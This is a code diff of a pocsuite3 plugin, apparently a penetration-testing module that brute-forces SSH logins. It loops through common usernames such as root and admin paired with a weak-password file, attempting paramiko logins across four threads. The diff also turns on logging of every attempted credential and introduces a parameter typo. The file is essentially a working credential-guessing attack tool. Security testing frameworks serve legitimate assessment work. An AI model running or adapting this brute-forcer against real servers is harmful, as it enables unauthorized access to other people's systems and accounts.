@@ -1,20 +1,18 @@
 """
 If you have issues about development, please read:
 https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
-for more about information, plz visit https://pocsuite.org
+for more about information, plz visit http://pocsuite.org
 """
 
 import itertools
 import logging
 import queue
 import socket
-from collections import OrderedDict
 
 import paramiko
 
 from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
 from pocsuite3.lib.core.data import paths
-from pocsuite3.lib.core.interpreter_option import OptInteger
 from pocsuite3.lib.core.threads import run_threads
 
 
@@ -37,20 +35,14 @@ class DemoPOC(POCBase):
     category = POC_CATEGORY.TOOLS.CRACK
     protocol = POC_CATEGORY.PROTOCOL.SSH
 
-    def _options(self):
-        o = OrderedDict()
-        o["ssh_burst_threads"] = OptInteger(4, description='set ssh_burst_threads', require=False)
-        return o
-
     def _verify(self):
         result = {}
         host = self.getg_option("rhost")
         port = self.getg_option("rport") or 22
-        ssh_burst_threads = self.get_option("ssh_burst_threads")
 
         task_queue = queue.Queue()
         result_queue = queue.Queue()
-        ssh_burst(host, port, task_queue, result_queue, ssh_burst_threads)
+        ssh_burst(host, port, task_queue, result_queue)
         if not result_queue.empty():
             username, password = result_queue.get()
             result['VerifyInfo'] = {}
@@ -74,9 +66,9 @@ class DemoPOC(POCBase):
 
 
 def get_word_list():
-    with open(paths.SSH_USER) as username:
-        with open(paths.SSH_PASS) as password:
-            return itertools.product(username, password)
+    common_username = ('ssh', 'test', 'root', 'guest', 'admin', 'daemon', 'user')
+    with open(paths.WEAK_PASS) as f:
+        return itertools.product(common_username, f)
 
 
 def port_check(host, port=22):
@@ -105,7 +97,7 @@ def ssh_login(host, port, username, password):
     return ret
 
 
-def task_init(host, port, task_queue, result_queue):
+def task_init(host, port, task_queue, reqult_queue):
     for username, password in get_word_list():
         task_queue.put((host, port, username.strip(), password.strip()))
 
@@ -113,15 +105,15 @@ def task_init(host, port, task_queue, result_queue):
 def task_thread(task_queue, result_queue):
     while not task_queue.empty():
         host, port, username, password = task_queue.get()
-        # logger.info('try burst {}:{} use username:{} password:{}'.format(
-        #     host, port, username, password))
+        logger.info('try burst {}:{} use username:{} password:{}'.format(
+            host, port, username, password))
         if ssh_login(host, port, username, password):
             with task_queue.mutex:
                 task_queue.queue.clear()
             result_queue.put((username, password))
 
 
-def ssh_burst(host, port, task_queue, result_queue, ssh_burst_threads):
+def ssh_burst(host, port, task_queue, result_queue):
     log = paramiko.util.logging.getLogger()
     log.setLevel(logging.CRITICAL)
 
@@ -130,7 +122,7 @@ def ssh_burst(host, port, task_queue, result_queue, ssh_burst_threads):
         return
     try:
         task_init(host, port, task_queue, result_queue)
-        run_threads(ssh_burst_threads, task_thread, args=(task_queue, result_queue))
+        run_threads(4, task_thread, args=(task_queue, result_queue))
     except Exception:
         pass
 
